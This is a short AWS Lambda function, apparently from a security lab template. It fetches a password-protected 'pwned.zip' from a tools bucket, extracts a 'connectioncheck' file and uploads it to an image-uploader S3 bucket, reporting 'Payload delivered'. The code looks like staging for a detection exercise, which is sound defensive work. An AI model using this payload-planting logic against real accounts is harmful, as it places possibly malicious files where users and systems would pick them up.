import boto3
import urllib.request
import zipfile

bucket = "${ImageUploaderS3Bucket}"
pwned_url = "https://${QSS3BucketName}.s3.${AWS::URLSuffix}/${ToolsPrefix}pwned.zip"
s3 = boto3.client("s3")

def get_payload():
    download_location = "/tmp/pwned.zip"
    with open(download_location, "wb") as control_file:
        res = urllib.request.urlopen(
            urllib.request.Request(url=pwned_url, method="GET"), timeout=5
        )
        control_file.write(res.read())

    with zipfile.ZipFile(download_location, "r") as zip_ref:
        zip_ref.extractall(path="/tmp", pwd=b"novirus")
    return "/tmp/connectioncheck"

def handler(event, context):
    connectioncheck_path = get_payload()
    s3.upload_file(connectioncheck_path, bucket, "connectioncheck")
    return {"status": "True", "statusCode": 200, "body": "Payload delivered"}
